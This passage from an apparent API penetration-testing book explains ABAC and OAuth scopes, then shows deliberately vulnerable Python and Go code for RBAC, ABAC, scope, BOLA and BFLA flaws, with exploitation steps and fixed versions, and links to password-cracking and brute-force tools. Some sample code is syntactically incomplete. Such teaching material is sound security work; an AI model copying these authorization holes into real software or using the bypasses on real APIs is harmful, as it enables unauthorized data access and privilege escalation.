				<li><strong class="bold">Resource</strong>: The API resource being accessed (e.g., data object or endpoint URL).</li>
				<li><strong class="bold">Action</strong>: The operation being attempted (e.g., read, write, or delete).</li>
				<li><strong class="bold">Environment</strong>: Contextual factors such as time, location, or specific conditions (e.g., emergency access).</li>
				<li><strong class="bold">Attributes</strong>: Additional data points associated with any of the preceding entities (e.g., user department, resource sensitivity level, or time of day).</li>
			</ul>
			<p>When a user interacts with the API, the system gathers relevant attributes from all involved entities. After that, the system evaluates predefined access control policies against the gathered attributes. These policies define conditions under which specific actions are permitted or denied. Finally, based on the policy evaluation outcome, access is either granted or denied.</p>
			<p>Some benefits of applying ABAC include granular and flexible control, which enables highly granular access control by considering various attributes beyond just roles, dynamic and <a id="_idIndexMarker365"/>adaptable policies that <a id="_idIndexMarker366"/>can be dynamically adjusted based on changing attributes, making it suitable for complex and evolving environments, and reduced misconfigurations, which, by focusing on specific attributes and conditions, mitigates the risk of misconfigured roles.</p>
			<p><strong class="bold">Amazon Web Services</strong> (<strong class="bold">AWS</strong>), for example, has a specific API for their resource group <a id="_idIndexMarker367"/>tagging, allowing a customer or partner to interact with their cloud resources by creating, attaching, updating, or deleting tags accordingly. Those tags can then be checked against an AWS IAM policy further on the cloud access control policy.</p>
			<h2 id="_idParaDest-69"><a id="_idTextAnchor071"/>OAuth scopes</h2>
			<p>OAuth scopes are somewhat like attributes in ABAC-backed APIs in the sense that they also apply labels. They act as mechanisms that define the specific permissions an application <a id="_idIndexMarker368"/>can request and, consequently, the level of access it receives to an API’s resources. OAuth scopes are essentially strings that represent specific sets <a id="_idIndexMarker369"/>of permissions associated with an API. When an application requests access to an API using OAuth, it specifies the desired scopes within its AuthZ request. The AuthZ server then evaluates these requested scopes against the application’s registered permissions and grants an access token with the corresponding level of access.</p>
			<p>From this, we can <a id="_idIndexMarker370"/>derive at least the following immediate benefits of leveraging OAuth scopes for an API:</p>
			<ul>
				<li><strong class="bold">Granular control</strong>: Enables precise control over API access by allowing applications to request only the specific permissions they require.</li>
				<li><strong class="bold">Reduced risk</strong>: Mitigates the risk of unauthorized access by limiting the scope of an application’s access token.</li>
				<li><strong class="bold">Improved transparency</strong>: Provides clear visibility into the permissions granted to each application, enhancing accountability and trust.</li>
			</ul>
			<p>Numerous different scopes can be created on an API to fulfill specific needs. Some types of scopes an API can leverage are <strong class="bold">read-only</strong> (allows an application to read data from specific API resources but not modify or delete them), <strong class="bold">write-only</strong> (grants an application the ability to create or update data within the API but not read existing information), <strong class="bold">full access</strong> (provides comprehensive access to all API resources, including read, write, and delete capabilities), <strong class="bold">user-specific</strong> (defines permissions based on the user associated with the application, enabling granular control within specific user contexts), and <strong class="bold">resource-specific</strong> (limits access to specific resources within the API, allowing applications to access only the data they need).</p>
			<p>The <a id="_idIndexMarker371"/>following Python code block shows <a id="_idIndexMarker372"/>some dummy examples of handling OAuth scopes on an API:</p>
			<pre class="source-code">
import requests
# providing the scope as part of the HTTP GET request
auth_url = "https://api.example.com/oauth/authorize"
params = {
  "client_id": "your_client_id",
  "redirect_uri": "your_redirect_uri",
  "response_type": "code",
  "scope": "read-write"
}
response = requests.get(auth_url, params=params)
# A JWT carrying the granted scope
token = {
  "access_token": "your_access_token",
  "expires_in": 3600,
  "scope": "read"
}
# How you could check the scopes in a request
headers = {
  "Authorization": f"Bearer {your_access_token}"
}
response = requests.get("https://api.example.com/resource",                          headers=headers)
# Check if at least read access was granted
if "read" in response.json().get("scopes", []):
  # Access granted
else:
  # Access denied due to insufficient scope
# Creating scopes with Flask
from flask import Flask
from flask_oauthlib.provider import OAuth1Provider
app = Flask(__name__)
scopes = {
  "read": "Read access to all resources",
  "write": "Write access to all resources",
  "user:read": "Read access to user data",
  "user:write": "Write access to user data"
}
@app.route("/api/protected")
@requires_oauth("read")
def protected_resource():
  # Access granted for users with the "read"</pre>			<p>The last <a id="_idIndexMarker373"/>portion of the code shows an easy way to leverage Flask’s OAuth <a id="_idIndexMarker374"/>library. Flask is a framework that makes it easier to build Python backend applications.</p>
			<p>Some widely known APIs that use OAuth scopes include Google Drive, GitHub, X (previously Twitter), Dropbox, and Facebook/Meta.</p>
			<p>Next, let’s learn how to circumvent access controls.</p>
			<h1 id="_idParaDest-70"><a id="_idTextAnchor072"/>Bypassing access controls</h1>
			<p>To be successful in bypassing access controls, you have to either explore misconfigurations or lack of configurations in APIs, or even some backend logic flaw. All mentioned AuthZ mechanisms are <a id="_idIndexMarker375"/>strong, but the way they were implemented on an API endpoint may make them useless, or at least vulnerable to some attempts.</p>
			<p>For the sake of illustrating this, let’s propose three different scenarios where you have, respectively, RBAC, ABAC, and OAuth scopes in place. Let’s understand how some exploits could be exercised. For RBAC, suppose you have an API that manages employee data, with different roles such as <code>employee</code> and <code>admin</code>. The <code>admin</code> role has access to all employee records, while the <code>employee</code> role can only access their own record. However, the API doesn’t properly validate the user’s role during certain operations. In other words, the following are the case:</p>
			<ul>
				<li>As an employee, you’re only supposed to access your own data. However, you notice that the API doesn’t check your role when updating your personal information.</li>
				<li>By modifying the API request to impersonate an admin user, you’re able to gain access to and modify any employee’s data, bypassing the intended RBAC controls.</li>
			</ul>
			<p>An excerpt <a id="_idIndexMarker376"/>of some vulnerable Python code is shown here. Observe the logic:</p>
			<pre class="source-code">
# This function updates employee information.
def update_employee_info(employee_id, new_info, user_role):
    if user_role == "admin":  # Incorrectly assuming user_role is trusted
        # Update employee info in the database
        ...
        return "Information updated successfully"
    else:
        return "Access denied. No permission to perform this operation."
# API endpoint to update employee information
@app.route('/employees/&lt;employee_id&gt;', methods=['PUT'])
def update_employee(employee_id):
    new_info = request.json
    user_role = get_user_role(request.headers['Authorization'])  # Function to get user role
    return update_employee_info(employee_id, new_info, user_role)</pre>			<p>The code simply fetches the role provided by the requestor from the headers without further checking whether such a claim is legitimate. Hence, in this case, once you submit a request with <code>user_role</code> as <code>admin</code>, you’ll receive full privileges on the API.</p>
			<p>Now, moving on to ABAC, consider an API for an online banking application where access to financial transactions is controlled based on the user’s account type (e.g., standard or premium) and the transaction amount. However, due to a flaw in the attribute validation logic, an attacker can manipulate the transaction amount attribute to execute high-value transactions.</p>
			<p>Observe an <a id="_idIndexMarker377"/>example of vulnerable code written in Python to represent this:</p>
			<pre class="source-code">
# Function to process financial transactions
def process_transaction(account_type, transaction_amount):
    if account_type == "standard" and transaction_amount &gt; 1000:
        return "Access denied! Transaction amount above limit."
    else:
        # Process the transaction
        ...
        return "Transaction processed successfully"
# API endpoint to initiate a financial transaction
@app.route('/transactions', methods=['POST'])
def initiate_transaction():
    transaction_data = request.json
    account_type = get_account_type(request.headers['Authorization'])
    return process_transaction(account_type, transaction_data['amount'])</pre>			<p>In this example, the <code>initiate_transaction</code> endpoint is intended to restrict high-value transactions for standard account types. However, the code fails to properly validate the transaction amount, allowing an attacker to manipulate the amount and bypass ABAC controls. Observe that, using an analogous approach to RBAC, the validation code is simply relying on what is claimed by the requestor. In this case, should you send any account type different than <code>standard</code>, you would be able to process the transaction regardless of its amount.</p>
			<p>Finally, let’s see a way that would make OAuth scopes vulnerable to exploitation. Suppose you have an API that provides access to user profile information, with different scopes such as <code>read_profile</code> and <code>write_profile</code>. However, due to a misconfiguration <a id="_idIndexMarker378"/>in the OAuth server, the access token issued to a user contains unintended scopes, enabling unauthorized access to sensitive resources.</p>
			<p>Look at the vulnerable code:</p>
			<pre class="source-code">
# Function to read user profile information
def read_profile(access_token):
    # Assuming access token scopes are trusted
    if "read_profile" in access_token.scopes:
        # Read user profile information
        ...
        return "User profile: {}".format(profile_info)
    else:
        return "Access denied. Insufficient scope."
# API endpoint to retrieve user profile
@app.route('/profile', methods=['GET'])
def get_profile():
    # Function to extract access token
    access_token = extract_access_token(request.headers['Authorization'])
    return read_profile(access_token)</pre>			<p>In this example, the <code>get_profile</code> endpoint is supposed to restrict access to users with the <code>read_profile</code> scope. However, the code incorrectly assumes that the access token scopes are trusted without proper validation, allowing an attacker to manipulate the token and bypass OAuth scope restrictions. In summary, if as part of the AuthZ token <a id="_idIndexMarker379"/>you send a claim for a privileged scope, you would achieve success with this backend code in place. There are two other topics that we can’t forget to mention. They are known by their acronyms: BOLA and BFLA.</p>
			<h2 id="_idParaDest-71"><a id="_idTextAnchor073"/>Broken Object Level Authorization (BOLA)</h2>
			<p>This consists of a security vulnerability that is present when an API does not correctly apply <a id="_idIndexMarker380"/>AuthZ verifications before effectively allowing access to objects and resources. This usually happens <a id="_idIndexMarker381"/>when an API solely relies on user input (such as object IDs) without checking whether the user providing them actually has permission to access such IDs. You can exploit this by manipulating inputs to achieve unauthorized access to data.</p>
			<p>To exemplify this, let’s consider a scenario where an API endpoint retrieves user details based on a user ID. If the endpoint does not check whether the authenticated user has access to the required ID or not, a pentester can provide any valid user ID to get other users’ data. This situation may be quite dangerous when the vulnerable API (or the application behind it) handles sensitive data, such as financial or health records. When BOLA is present on an application or API code, you can enumerate object IDs and access unauthorized data. Observe the following Python code, which has a BOLA vulnerability:</p>
			<pre class="source-code">
from flask import Flask, request, jsonify
app = Flask(__name__)
def get_user_by_id(user_id):    users = {        "1": {"id": 1, "name": "Alice", "role": "admin"},        "2": {"id": 2, "name": "Bob", "role": "user"},        "3": {"id": 3, "name": "Charlie", "role": "user"}    }    return users.get(user_id, None)
@app.route('/user', methods=['GET'])def get_user():    user_id = request.args.get('id')    user = get_user_by_id(user_id)    if user:        return jsonify(user)    else:        return jsonify({"error": "User not found"}), 404
if __name__ == '__main__':    app.run()</pre>			<p>Any <a id="_idIndexMarker382"/>authenticated user can access other <a id="_idIndexMarker383"/>users’ details by simply providing their ID.  Now observe an example of a change that removes the vulnerability:</p>
			<pre class="source-code">
from flask import Flask, request, jsonify
app = Flask(__name__)
def get_current_user():    return {"id": 2, "name": "Bob", "role": "user"}  # Mocked current user
def get_user_by_id(user_id):    users = {        "1": {"id": 1, "name": "Alice", "role": "admin"},        "2": {"id": 2, "name": "Bob", "role": "user"},        "3": {"id": 3, "name": "Charlie", "role": "user"}    }    return users.get(user_id, None)
@app.route('/user', methods=['GET'])def get_user():    current_user = get_current_user()  # Get the authenticated user     user_id = request.args.get('id')    user = get_user_by_id(user_id)
    if not user:        return jsonify({"error": "User not found"}), 404
    # Check if the current user is trying to access their own data
    if str(current_user['id']) != user_id:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(user)
if __name__ == '__main__':
    app.run()</pre>			<p>Observe <a id="_idIndexMarker384"/>the <code>get_user_by_id</code> function <a id="_idIndexMarker385"/>returning <code>None</code> if an invalid user ID is provided. Let’s move on to BFLA next.</p>
			<h2 id="_idParaDest-72"><a id="_idTextAnchor074"/>Broken Function Level Authorization (BFLA)</h2>
			<p>This occurs when an API or the application behind it does not correctly apply AuthZ checks <a id="_idIndexMarker386"/>to its functions and actions, which allows attackers to run functions or access resources they don’t have permission to. This <a id="_idIndexMarker387"/>vulnerability usually shows up when there are no access control policies or they lack sophistication, and the application trusts user roles or privileges without properly verifying them before allowing function executions.</p>
			<p>For example, consider an API that provides functionalities not properly restricted to authorized users. If a pentester with lower permissions can run tasks such as creating or changing users, the whole API security may be compromised. Even new administrators could be created by such a pentester. Observe the following Golang code, which uses BFLA:</p>
			<pre class="source-code">
package main
import (
    "encoding/json"
    "net/http"
    "strconv"
    "github.com/gorilla/mux"
)
type User struct {
    ID    int    `json:"id"`
    Name  string `json:"name"`
    Role  string `json:"role"`
}
var users = []User{
    {ID: 1, Name: "Alice", Role: "admin"},
    {ID: 2, Name: "Bob", Role: "user"},
    {ID: 3, Name: "Charlie", Role: "user"},
}
func createUser(w http.ResponseWriter, r *http.Request) {
    var newUser User
    json.NewDecoder(r.Body).Decode(&amp;newUser)
    users = append(users, newUser)
    w.WriteHeader(http.StatusCreated)
    json.NewEncoder(w).Encode(newUser)
}
func main() {
    r := mux.NewRouter()
    r.HandleFunc("/admin/create_user", createUser).Methods("POST")
    http.ListenAndServe(":8000", r)
}</pre>			<p>Any <a id="_idIndexMarker388"/>user could access the <code>/admin/create_user</code> endpoint to create a new user. Now look at a suggestion of code <a id="_idIndexMarker389"/>to remove the vulnerability:</p>
			<pre class="source-code">
package main
import (
    "encoding/json"
    "net/http"
    "strings"
    "github.com/gorilla/mux"
)
type User struct {
    ID    int    `json:"id"`
    Name  string `json:"name"`
    Role  string `json:"role"`
}
var users = []User{
    {ID: 1, Name: "Alice", Role: "admin"},
    {ID: 2, Name: "Bob", Role: "user"},
    {ID: 3, Name: "Charlie", Role: "user"},
}
func getCurrentUser(r *http.Request) *User {
    authHeader := r.Header.Get("Authorization")
    if strings.HasPrefix(authHeader, "Bearer ") {
        token := strings.TrimPrefix(authHeader, "Bearer ")
        if token == "admin-token" {
            return &amp;User{ID: 1, Name: "Alice", Role: "admin"}
        }
    }
    return nil
}
func requireAdminRole(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request){
        user := getCurrentUser(r)
        if user == nil || user.Role != "admin" {
            http.Error(w, "Forbidden", http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}
func createUser(w http.ResponseWriter, r *http.Request) {
    var newUser User
    json.NewDecoder(r.Body).Decode(&amp;newUser)
    users = append(users, newUser)
    w.WriteHeader(http.StatusCreated)
    json.NewEncoder(w).Encode(newUser)
}
func main() {
    r := mux.NewRouter()
    r.Handle("/admin/create_user", requireAdminRole(http.HandlerFunc(createUser))).Methods("POST")
    http.ListenAndServe(":8000", r)
}</pre>			<p>You <a id="_idIndexMarker390"/>just learned how to identify and fix, with <a id="_idIndexMarker391"/>straightforward code changes, one of the most dangerous vulnerabilities that affect APIs. The <code>getCurrentUser</code> and <code>requireAdminRole</code> functions were implemented to reinforce protection on the AuthZ logic.</p>
			<h1 id="_idParaDest-73"><a id="_idTextAnchor075"/>Summary</h1>
			<p>This chapter covered additional topics relating to an API pentest. We have looked at both the AuthN and AuthZ mechanisms, their details, and ways they can present themselves as vulnerable enough to be exploitable. You also learned about weak API credentials and default accounts, along with techniques to discover and leverage them as part of your attack. These constitute a very important part of any API pentest since other stages, such as persistence, lateral movement, and data exfiltration all depend on the successful exploitation of AuthN and AuthZ.</p>
			<p>In the next chapter, which also starts <em class="italic">Part 3</em> of this book, you will be introduced to injection attacks and validation testing. The damage such attacks can cause can be massive and successfully protecting against them by implementing a correct user input validation is key. See you there!</p>
			<h1 id="_idParaDest-74"><a id="_idTextAnchor076"/>Further reading</h1>
			<ul>
				<li>CKAN, a Python framework to support open data websites: <a href="https://ckan.org/">https://ckan.org/</a></li>
				<li>Open Data Handbook, explaining basic concepts around open data: <a href="https://opendatahandbook.org/guide/en/">https://opendatahandbook.org/guide/en/</a></li>
				<li>OAuth 2.0 Security Best Practices: <a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a></li>
				<li>More OAuth grant flows and some graphics: <a href="https://frontegg.com/blog/oauth-grant-types">https://frontegg.com/blog/oauth-grant-types</a></li>
				<li>Exploring CookieMonster: <a href="https://ian.sh/cookiemonster">https://ian.sh/cookiemonster</a></li>
				<li>RFC 7517, which defines JSON Web Keys: <a href="https://datatracker.ietf.org/doc/html/rfc7517">https://datatracker.ietf.org/doc/html/rfc7517</a></li>
				<li>JWT Cracker, a tool written in C to crack JWTs with brute force: <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li>
				<li>A curated list of tools and lists for cracking systems: <a href="https://github.com/n0kovo/awesome-password-cracking">https://github.com/n0kovo/awesome-password-cracking</a></li>
				<li><em class="italic">Top 200 Most Common </em><em class="italic">Passwords</em>: <a href="https://nordpass.com/most-common-passwords-list/">https://nordpass.com/most-common-passwords-list/</a></li>
				<li>Mentalist, a tool to create your own password lists: <a href="https://github.com/sc0tfree/mentalist">https://github.com/sc0tfree/mentalist</a></li>
				<li>Patator – a brute-force attacker with fuzzing and password spraying features: <a href="https://salsa.debian.org/pkg-security-team/patator">https://salsa.debian.org/pkg-security-team/patator</a></li>
				<li><em class="italic">AWS Resource Group Tagging API </em><em class="italic">Reference</em>: <a href="https://docs.aws.amazon.com/resourcegroupstagging/latest/APIReference/overview.html">https://docs.aws.amazon.com/resourcegroupstagging/latest/APIReference/overview.html</a></li>
			</ul>
		</div>
	

		<div><h1 id="_idParaDest-75" lang="en-US" xml:lang="en-US"><a id="_idTextAnchor077"/>Part 3: API Basic Attacks</h1>
			<p>Now that you have been introduced to basic attacks in <em class="italic">Part 2</em>, it’s time to move on and increase your knowledge of more types of attacks. In this part, you will learn about techniques that you must not ignore while targeting APIs. We will discuss adapted SQL and NoSQL injection attacks, the problems caused by bad user input sanitization, what happens when an error is not correctly handled, and finally, the feared denial-of-service attack. You will also be presented with some ways to block or at least reduce the chances of such attacks being successful.</p>
			<p>This section contains the following chapters:</p>
			<ul>
				<li><a href="B19657_05.xhtml#_idTextAnchor078"><em class="italic">Chapter 5</em></a>, <em class="italic">Injection Attacks and Validation Testing</em></li>
				<li><a href="B19657_06.xhtml#_idTextAnchor102"><em class="italic">Chapter 6</em></a>, <em class="italic">Error Handling and Exception Testing</em></li>
				<li><a href="B19657_07.xhtml#_idTextAnchor110"><em class="italic">Chapter 7</em></a>, <em class="italic">Denial of Service and Rate-Limiting Testing</em></li>
			</ul>
		</div>
		<div><div></div>
		</div>
		<div><div></div>
		</div>
	</body></html>